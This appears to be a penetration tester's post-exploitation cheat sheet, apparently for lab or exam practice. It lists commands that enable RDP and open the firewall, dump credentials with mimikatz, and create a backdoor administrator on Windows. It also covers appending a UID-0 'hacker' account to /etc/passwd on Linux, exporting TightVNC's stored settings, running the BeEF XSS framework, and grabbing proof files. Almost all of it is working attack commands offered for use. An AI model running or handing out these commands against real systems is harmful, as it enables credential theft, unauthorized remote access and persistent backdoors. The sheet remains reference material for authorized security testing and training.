# enable rdp
* powershell
    > Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0
    > Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
    > Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 1
* cmd
    > reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

# mimikatz
* 2.1.1: https://github.com/gentilkiwi/mimikatz/files/4167347/mimikatz_trunk.zip, work on win10
* dump hashes/password
    * `mimikatz`: https://github.com/gentilkiwi/mimikatz
    > mimikatz.exe
        > privilege::debug
        > sekurlsa::logonpasswords full
    > m64.exe "privilege::debug" "sekurlsa::logonpasswords full" "exit"
    > pwdump/mimikatz (hash/sometimes getting passwd clear text)

# add user
* windows
    > net user hacker pass123 /add && net localgroup administrators hacker /add
* linux
    > openssl passwd -1 -salt hacker pass123
    > echo 'hacker:$1$hacker$zVnrpoW2JQO5YUrLmAs.o1:0:0:root:/root:/bin/bash' >> /etc/passwd
    > echo 'echo "hacker:\$1\$hacker\$zVnrpoW2JQO5YUrLmAs.o1:0:0:root:/root:/bin/bash" >> /etc/passwd' > file

# get ip address
* linux: ip address


# TightVNC Reg
> reg export "HKLM\Software\TightVNC\Server" foo.reg

# beef
* change port to 3000
> vi /etc/beef-xss/config.yaml
> journalctl -u beef-xss
> systemctl stop beef-xss.service;beef-xss

# proof
> hostname && id && cat proof.txt && ip a
> hostname && whoami && type proof.txt && ipconfig /all
